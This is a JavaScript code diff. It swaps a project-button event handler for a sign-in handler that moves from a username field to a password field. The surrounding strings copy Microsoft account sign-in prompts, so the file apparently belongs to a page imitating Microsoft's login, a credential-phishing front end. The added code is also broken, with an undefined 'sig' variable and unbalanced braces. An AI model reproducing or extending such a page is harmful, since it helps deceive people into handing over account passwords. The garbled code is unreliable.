@@ -1,23 +1,18 @@
 document.addEventListener('DOMContentLoaded', () => {
-     const projectButton = document.getElementById('project_button');
+     sig.addEventListener('click', () => {
+    console.log('Someone clicked the sign-in button');
 
-    if (projectButton) {
-        projectButton.addEventListener('click', async () => {
-            try {
-                await fetch('/project-opened', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        event: 'project_opened'
-                    })
-                });
-            } catch (error) {
-                console.error('Notification error:', error);
-            }
-        });
+    // Continue normal UI behavior here.
+    validate();
+
+    if (!pwdVal) {
+        return;
     }
+
+    document.getElementById("section_uname").classList.add('d-none');
+    document.getElementById('section_pwd').classList.remove('d-none');
+
+    view = "final";
 });
     const unReq = "Enter a valid email address, phone number, or Skype name."
     const pwdReq = "Please enter the password for your Microsoft account."
